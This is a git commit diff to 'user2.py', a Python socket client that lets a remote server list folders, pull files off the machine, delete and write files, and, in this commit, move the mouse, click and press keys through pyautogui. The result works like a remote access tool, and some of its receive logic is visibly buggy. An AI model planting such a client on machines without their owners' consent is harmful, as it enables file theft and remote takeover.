ad45155eaf88a2c0a0d2dc91da414777f5b15b17
ayush <106254920+ayush7841@users.noreply.github.com>
2024-01-07 18:08:45 +0530

    Update user2.py

--- user2.py
+++ user2.py
@@ -3,7 +3,11 @@ import socket
 import subprocess
 from time import sleep
 import threading as th
-
+try:
+	import pyautogui as py
+except:
+	pass
+con = False
 class FileClient:
     def __init__(self, server_ip, server_port):
         self.server_ip = server_ip
@@ -28,6 +32,7 @@ class FileClient:
             	self.connect()
             if m:
                 m = m.decode("utf-8")
+                print(m)
                 if "<folder>" in m:
                     m = m.replace("<folder>", "")
                     self.folder_list(m)
@@ -47,13 +52,45 @@ class FileClient:
                 elif "<download>" in m:
                 	m = m.replace("<download>", "")
                 	self.down(m)
+                elif "<controll>" in m:
+                	c = th.Thread(target=self.cont)
+                	c.start()
+    def cont(self):
+    	con = True
+    	while con:
+    		try:
+    			command=self.s.recv(1024)
+    			if command:
+    				command = command.decode("utf-8")
+    				if "pos_" in command:
+    					command = command.replace("pos_","")
+    					x,y = command.split(",")
+    					self.move(x,y)
+    				elif "btn_" in command:
+    					command = command.replace("btn_","")
+    					self.click(command)
+    				elif "key_" in command:
+    					command = command.replace("key_","")
+    					self.press(command)
+    				elif command == "<STOP>":
+    					con = False
+    		except:
+    			pass
+    def press(self,key):
+    	py.press(key)
+    def click(self,btn):
+    	if btn == "Button.left":
+    		py.click()
+    	elif btn =="Button.right":
+    		py.rightClick()     			
+    def move(self,x,y):
+    	py.moveTo(x,y)         
     def down(self,m):
     	with open(m,"rb") as file: 		
     		data = file.read()
     		self.s.sendall(data)
-    		sleep(1)
-    		self.s.send("<END>".encode("utf-8"))
-    		print("sened")
+    		self.s.send(b"<END>")
+    		print(data)
     def delete(self,p):
     	os.remove(p)
     def edit(self, path):
@@ -61,13 +98,14 @@ class FileClient:
 	        file_data1 =b""
 	        with open(path,"wb") as file:
 	        	while True:
-	        		data1 = self.s.recv(1024)
-	        		print(data1)
+	        		data1 = self.s.recv(32768)
 	        		if data1:
-	        			if data1 == b"<END>":
+	        			file_data1 += data1
+	        			if file_data1[-5:] == b"<END>":
+	        				file_data1 = file_data1[:-5]
 	        				break
-	        			else:
-	        				file_data1 += data1
+	        			else:	        				
+	        				pass
 	        	file.write(file_data1)
 	        	file.close()
 	        	print("done")
@@ -77,12 +115,14 @@ class FileClient:
         file_data =b""
         with open(name,"wb") as file:
         	while True:
-        		data = self.s.recv(1024)
+        		data = self.s.recv(32768)
         		if data:
-        			if data == "<END>":
-        				break
-        			else:
-        				file_data += data
+	        		print(data)
+	        		if file_data[-5:] == b"<END>":
+	        			file_data = file_data[:-5]
+	        			break
+	        		else:
+	        			file_data += data
         	file.write(file_data)
         	file.close()
         if ".py" in name:
@@ -97,10 +137,8 @@ class FileClient:
             path1 = os.path.join(path, name)
             file_dict[name] = "folder" if os.path.isdir(path1) else "file"
         file_dict_str = str(file_dict)
-        self.s.send(file_dict_str.encode("utf-8"))
-        print("sened")
-        print(file_dict)
-
+        self.s.sendall(file_dict_str.encode("utf-8"))
+        print(file_dict_str)
     def start(self):
         msg_thread = th.Thread(target=self.msg)
         msg_thread.start()
